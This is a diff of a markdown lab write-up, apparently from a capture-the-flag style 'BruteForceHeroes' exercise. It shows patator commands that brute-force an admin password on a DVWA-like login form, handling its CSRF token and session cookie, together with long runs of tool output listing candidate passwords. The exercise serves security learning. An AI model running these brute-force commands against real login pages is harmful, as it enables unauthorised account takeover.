@@ -337,67 +337,81 @@ Add the -x ignore: action to the end of your existing patator command (right aft
 <p>5.1. What action can we use to show only the correct password (the answer includes '  ')?<br>
 <code>-x ignore:fgrep='Location: login.php'</code></p>
 
+
 ```bash
 :~/BruteForceHeroes# patator http_fuzz method=POST --threads=64 timeout=10 url="http://10.201.76.76/login.php" 0=/root/BruteForceHeroes/passwords.txt body="username=admin&password=FILE0&Login=Login&user_token=70d5a777a1d13f532d6edbba6c3c4071/login.php" header="Cookie: PHPSESSID=69dr414b9i2kvao0mk74drkb3r; security=impossible" -x ignore:fgrep='Location:login.php'
 ...
-23:35:53 patator    FAIL - xxx  89:-1         27.675 | 123456                             |     1 | <class 'pycurl.error'> (7, 'Failed to connect to 10.201.76.76 port 80: No route to host')
-23:35:53 patator    FAIL - xxx  89:-1         27.784 | 123456789                          |     3 | <class 'pycurl.error'> (7, 'Failed to connect to 10.201.76.76 port 80: No route to host')
-23:35:53 patator    FAIL - xxx  89:-1         27.777 | password                           |     4 | <class 'pycurl.error'> (7, 'Failed to connect to 10.201.76.76 port 80: No route to host')
-23:35:53 patator    FAIL - xxx  89:-1         27.755 | iloveyou                           |     5 | <class 'pycurl.error'> (7, 'Failed to connect to 10.201.76.76 port 80: No route to host')
-23:35:53 patator    FAIL - xxx  89:-1         27.734 | rockyou                            |     8 | <class 'pycurl.error'> (7, 'Failed to connect to 10.201.76.76 port 80: No route to host')
-23:35:53 patator    FAIL - xxx  89:-1         27.681 | 12345678                           |     9 | <class 'pycurl.error'> (7, 'Failed to connect to 10.201.76.76 port 80: No route to host')
-23:35:53 patator    FAIL - xxx  89:-1         27.737 | abc123                             |    10 | <class 'pycurl.error'> (7, 'Failed to connect to 10.201.76.76 port 80: No route to host')
-23:35:53 patator    FAIL - xxx  89:-1         27.696 | nicole                             |    11 | <class 'pycurl.error'> (7, 'Failed to connect to 10.201.76.76 port 80: No route to host')
-23:35:53 patator    FAIL - xxx  89:-1         27.631 | monkey                             |    14 | <class 'pycurl.error'> (7, 'Failed to connect to 10.201.76.76 port 80: No route to host')
-23:35:53 patator    FAIL - xxx  89:-1         27.668 | lovely                             |    15 | <class 'pycurl.error'> (7, 'Failed to connect to 10.201.76.76 port 80: No route to host')
-23:35:53 patator    FAIL - xxx  89:-1         27.681 | jessica                            |    16 | <class 'pycurl.error'> (7, 'Failed to connect to 10.201.76.76 port 80: No route to host')
-23:35:53 patator    FAIL - xxx  89:-1         27.678 | 654321                             |    17 | <class 'pycurl.error'> (7, 'Failed to connect to 10.201.76.76 port 80: No route to host')
-23:35:53 patator    FAIL - xxx  89:-1         27.664 | michael                            |    18 | <class 'pycurl.error'> (7, 'Failed to connect to 10.201.76.76 port 80: No route to host')
-23:35:53 patator    FAIL - xxx  89:-1         27.668 | ashley                             |    19 | <class 'pycurl.error'> (7, 'Failed to connect to 10.201.76.76 port 80: No route to host')
-23:35:53 patator    FAIL - xxx  89:-1         27.769 | qwerty                             |    20 | <class 'pycurl.error'> (7, 'Failed to connect to 10.201.76.76 port 80: No route to host')
-23:35:53 patator    FAIL - xxx  89:-1         27.768 | 111111                             |    21 | <class 'pycurl.error'> (7, 'Failed to connect to 10.201.76.76 port 80: No route to host')
-23:35:53 patator    FAIL - xxx  89:-1         27.759 | 000000                             |    23 | <class 'pycurl.error'> (7, 'Failed to connect to 10.201.76.76 port 80: No route to host')
-23:35:53 patator    FAIL - xxx  89:-1         27.755 | michelle                           |    24 | <class 'pycurl.error'> (7, 'Failed to connect to 10.201.76.76 port 80: No route to host')
-23:35:53 patator    FAIL - xxx  89:-1         27.731 | tigger                             |    25 | <class 'pycurl.error'> (7, 'Failed to connect to 10.201.76.76 port 80: No route to host')
-23:35:53 patator    FAIL - xxx  89:-1         27.742 | sunshine                           |    26 | <class 'pycurl.error'> (7, 'Failed to connect to 10.201.76.76 port 80: No route to host')
-23:35:53 patator    FAIL - xxx  89:-1         27.724 | chocolate                          |    27 | <class 'pycurl.error'> (7, 'Failed to connect to 10.201.76.76 port 80: No route to host')
-23:35:53 patator    FAIL - xxx  89:-1         27.711 | password1                          |    28 | <class 'pycurl.error'> (7, 'Failed to connect to 10.201.76.76 port 80: No route to host')
-23:35:53 patator    FAIL - xxx  89:-1         27.709 | anthony                            |    30 | <class 'pycurl.error'> (7, 'Failed to connect to 10.201.76.76 port 80: No route to host')
-23:35:53 patator    FAIL - xxx  89:-1         27.703 | butterfly                          |    32 | <class 'pycurl.error'> (7, 'Failed to connect to 10.201.76.76 port 80: No route to host')
-23:35:53 patator    FAIL - xxx  89:-1         27.680 | purple                             |    33 | <class 'pycurl.error'> (7, 'Failed to connect to 10.201.76.76 port 80: No route to host')
-23:35:53 patator    FAIL - xxx  89:-1         27.717 | liverpool                          |    36 | <class 'pycurl.error'> (7, 'Failed to connect to 10.201.76.76 port 80: No route to host')
-23:35:53 patator    FAIL - xxx  89:-1         27.704 | justin                             |    37 | <class 'pycurl.error'> (7, 'Failed to connect to 10.201.76.76 port 80: No route to host')
-23:35:53 patator    FAIL - xxx  89:-1         27.694 | loveme                             |    38 | <class 'pycurl.error'> (7, 'Failed to connect to 10.201.76.76 port 80: No route to host')
-23:35:53 patator    FAIL - xxx  89:-1         27.717 | 123123                             |    39 | <class 'pycurl.error'> (7, 'Failed to connect to 10.201.76.76 port 80: No route to host')
-23:35:53 patator    FAIL - xxx  89:-1         27.685 | secret                             |    41 | <class 'pycurl.error'> (7, 'Failed to connect to 10.201.76.76 port 80: No route to host')
-23:35:53 patator    FAIL - xxx  89:-1         27.613 | jennifer                           |    44 | <class 'pycurl.error'> (7, 'Failed to connect to 10.201.76.76 port 80: No route to host')
-23:35:53 patator    FAIL - xxx  89:-1         27.627 | joshua                             |    45 | <class 'pycurl.error'> (7, 'Failed to connect to 10.201.76.76 port 80: No route to host')
-23:35:53 patator    FAIL - xxx  89:-1         27.604 | superman                           |    48 | <class 'pycurl.error'> (7, 'Failed to connect to 10.201.76.76 port 80: No route to host')
-23:35:53 patator    FAIL - xxx  89:-1         27.606 | hannah                             |    49 | <class 'pycurl.error'> (7, 'Failed to connect to 10.201.76.76 port 80: No route to host')
-23:35:53 patator    FAIL - xxx  89:-1         27.617 | loveyou                            |    51 | <class 'pycurl.error'> (7, 'Failed to connect to 10.201.76.76 port 80: No route to host')
-23:35:53 patator    FAIL - xxx  89:-1         27.629 | pretty                             |    52 | <class 'pycurl.error'> (7, 'Failed to connect to 10.201.76.76 port 80: No route to host')
-23:35:53 patator    FAIL - xxx  89:-1         27.607 | basketball                         |    53 | <class 'pycurl.error'> (7, 'Failed to connect to 10.201.76.76 port 80: No route to host')
-23:35:53 patator    FAIL - xxx  89:-1         27.608 | angels                             |    55 | <class 'pycurl.error'> (7, 'Failed to connect to 10.201.76.76 port 80: No route to host')
-23:35:53 patator    FAIL - xxx  89:-1         27.588 | tweety                             |    56 | <class 'pycurl.error'> (7, 'Failed to connect to 10.201.76.76 port 80: No route to host')
-23:35:57 patator    FAIL - xxx  89:-1         30.651 | andrew                             |    54 | <class 'pycurl.error'> (7, 'Failed to connect to 10.201.76.76 port 80: No route to host')
-23:35:57 patator    FAIL - xxx  89:-1         30.639 | flower                             |    57 | <class 'pycurl.error'> (7, 'Failed to connect to 10.201.76.76 port 80: No route to host')
-23:35:57 patator    FAIL - xxx  89:-1         30.655 | playboy                            |    58 | <class 'pycurl.error'> (7, 'Failed to connect to 10.201.76.76 port 80: No route to host')
-23:35:57 patator    FAIL - xxx  89:-1         30.649 | elizabeth                          |    60 | <class 'pycurl.error'> (7, 'Failed to connect to 10.201.76.76 port 80: No route to host')
-23:35:57 patator    FAIL - xxx  89:-1         30.642 | tinkerbell                         |    62 | <class 'pycurl.error'> (7, 'Failed to connect to 10.201.76.76 port 80: No route to host')
-23:35:57 patator    FAIL - xxx  89:-1         30.644 | charlie                            |    63 | <class 'pycurl.error'> (7, 'Failed to connect to 10.201.76.76 port 80: No route to host')
-23:35:57 patator    FAIL - xxx  89:-1         30.652 | samantha                           |    64 | <class 'pycurl.error'> (7, 'Failed to connect to 10.201.76.76 port 80: No route to host')
-clear
+00:00:54 patator    INFO - 302  281:0          0.002 | 555555                             |   126 | HTTP/1.1 302 Found
+00:00:54 patator    INFO - 302  281:0          0.002 | martin                             |   190 | HTTP/1.1 302 Found
+00:00:54 patator    INFO - 302  281:0          0.002 | diana                              |   254 | HTTP/1.1 302 Found
+00:00:54 patator    INFO - 302  281:0          0.001 | chester                            |   318 | HTTP/1.1 302 Found
+00:00:54 patator    INFO - 302  281:0          0.009 | michael1                           |   382 | HTTP/1.1 302 Found
+00:00:54 patator    INFO - 302  281:0          0.006 | miamor                             |   446 | HTTP/1.1 302 Found
+00:00:54 patator    INFO - 302  281:0          0.009 | hockey                             |   510 | HTTP/1.1 302 Found
+00:00:54 patator    INFO - 302  281:0          0.002 | evelyn                             |   574 | HTTP/1.1 302 Found
+00:00:54 patator    INFO - 302  281:0          0.008 | swimming                           |   638 | HTTP/1.1 302 Found
+00:00:54 patator    INFO - 302  281:0          0.006 | nothing                            |   702 | HTTP/1.1 302 Found
+00:00:54 patator    INFO - 302  281:0          0.014 | loveme1                            |   766 | HTTP/1.1 302 Found
+00:00:54 patator    INFO - 302  281:0          0.013 | 1Puddles                           |   830 | HTTP/1.1 302 Found
+00:00:54 patator    INFO - 302  281:0          0.007 | jazmin                             |   894 | HTTP/1.1 302 Found
+00:00:54 patator    INFO - 302  281:0          0.025 | lolipop                            |   958 | HTTP/1.1 302 Found
+00:00:54 patator    INFO - 302  281:0          0.018 | 123123123                          |  1022 | HTTP/1.1 302 Found
+00:00:54 patator    INFO - 302  281:0          0.028 | diosesamor                         |  1086 | HTTP/1.1 302 Found
+00:00:54 patator    INFO - 302  281:0          0.011 | lorenzo                            |  1150 | HTTP/1.1 302 Found
+00:00:54 patator    INFO - 302  281:0          2.470 | charlie                            |    63 | HTTP/1.1 302 Found
+00:00:54 patator    INFO - 302  281:0          0.002 | diamond                            |   127 | HTTP/1.1 302 Found
+00:00:54 patator    INFO - 302  281:0          0.002 | greenday                           |   191 | HTTP/1.1 302 Found
+00:00:54 patator    INFO - 302  281:0          0.001 | samsung                            |   255 | HTTP/1.1 302 Found
+00:00:54 patator    INFO - 302  281:0          0.009 | 101010                             |   319 | HTTP/1.1 302 Found
+00:00:54 patator    INFO - 302  281:0          0.002 | jeffrey                            |   383 | HTTP/1.1 302 Found
+00:00:54 patator    INFO - 302  281:0          0.010 | lover                              |   447 | HTTP/1.1 302 Found
+00:00:54 patator    INFO - 302  281:0          0.005 | 444444                             |   511 | HTTP/1.1 302 Found
+00:00:54 patator    INFO - 302  281:0          0.004 | familia                            |   575 | HTTP/1.1 302 Found
+00:00:54 patator    INFO - 302  281:0          0.009 | millie                             |   639 | HTTP/1.1 302 Found
+00:00:54 patator    INFO - 302  281:0          0.013 | glitter                            |   703 | HTTP/1.1 302 Found
+00:00:54 patator    INFO - 302  281:0          0.009 | milagros                           |   767 | HTTP/1.1 302 Found
+00:00:54 patator    INFO - 302  281:0          0.016 | 1Promise                           |   831 | HTTP/1.1 302 Found
+00:00:54 patator    INFO - 302  281:0          0.004 | rosita                             |   895 | HTTP/1.1 302 Found
+00:00:54 patator    INFO - 302  281:0          0.003 | butterfly1                         |   959 | HTTP/1.1 302 Found
+00:00:54 patator    INFO - 302  281:0          0.006 | joshua1                            |  1023 | HTTP/1.1 302 Found
+00:00:54 patator    INFO - 302  281:0          0.006 | stars                              |  1087 | HTTP/1.1 302 Found
+00:00:54 patator    INFO - 302  281:0          0.004 | hamster                            |  1151 | HTTP/1.1 302 Found
+00:00:54 patator    INFO - 302  281:0          0.004 | gilbert                            |  1215 | HTTP/1.1 302 Found
+00:00:54 patator    INFO - 302  281:0          0.005 | dragons                            |  1279 | HTTP/1.1 302 Found
+00:00:54 patator    INFO - 302  281:0          0.004 | angelita                           |  1343 | HTTP/1.1 302 Found
+00:00:54 patator    INFO - 302  281:0          0.004 | arthur                             |  1407 | HTTP/1.1 302 Found
+00:00:54 patator    INFO - 302  281:0          0.002 | goober                             |  1471 | HTTP/1.1 302 Found
+00:00:54 patator    INFO - 302  281:0          0.002 | karate                             |  1535 | HTTP/1.1 302 Found
+00:00:54 patator    INFO - 302  281:0          0.002 | blacky                             |  1599 | HTTP/1.1 302 Found
+00:00:54 patator    INFO - 302  281:0          2.503 | samantha                           |    64 | HTTP/1.1 302 Found
+00:00:54 patator    INFO - 302  281:0          0.001 | carolina                           |   128 | HTTP/1.1 302 Found
+00:00:54 patator    INFO - 302  281:0          0.004 | november                           |   192 | HTTP/1.1 302 Found
+00:00:54 patator    INFO - 302  281:0          0.002 | freedom                            |   256 | HTTP/1.1 302 Found
+00:00:54 patator    INFO - 302  281:0          0.003 | smokey                             |   320 | HTTP/1.1 302 Found
+00:00:54 patator    INFO - 302  281:0          0.009 | stephen                            |   384 | HTTP/1.1 302 Found
+00:00:54 patator    INFO - 302  281:0          0.006 | chris1                             |   448 | HTTP/1.1 302 Found
+00:00:54 patator    INFO - 302  281:0          0.007 | sharon                             |   512 | HTTP/1.1 302 Found
 ...
 ```
 
-<img width="1084" height="455" alt="image" src="https://github.com/user-attachments/assets/95cbba7c-82ec-4979-af54-1826e176fafa" />
+<img width="1274" height="774" alt="image" src="https://github.com/user-attachments/assets/f19dc2a0-4d7a-4a3f-9bf5-e0dd136a034d" />
 
+<br>
+<br>
+<br>
+
+```bash
+:~/BruteForceHeroes# patator http_fuzz method=POST --threads=64 timeout=10 url="http://${IP}/login.php" 0=/root/BruteForceHeroes/passwords.txt body="username=admin&password=FILE0&Login=Login&user_token=${CSRF}" header="Cookie: PHPSESSID=${SESSIONID}; security=impossible" -x ignore:fgrep=login.php
+```
+
+<img width="1201" height="85" alt="image" src="https://github.com/user-attachments/assets/55c6339f-5ef8-4aca-ae57-46e4e7c24939" />
+
+<br>
 <br>
 <br>
 <p>
 
-- waited for a loooooooooong time for patator execution ... FAIL ... FAIL ... FAIL<br>
-- decided to use gotm1lk instead<br>    
+- practiced gotm1lk<br>    
 - navigated to https://<coe>blog.g0tmi1k.com/dvwa/login/</code></p>
 
 <p align="center"><img width="1200px" src="https://github.com/user-attachments/assets/51c62612-58e6-45b9-abf4-1564e0dfe08c"></p>
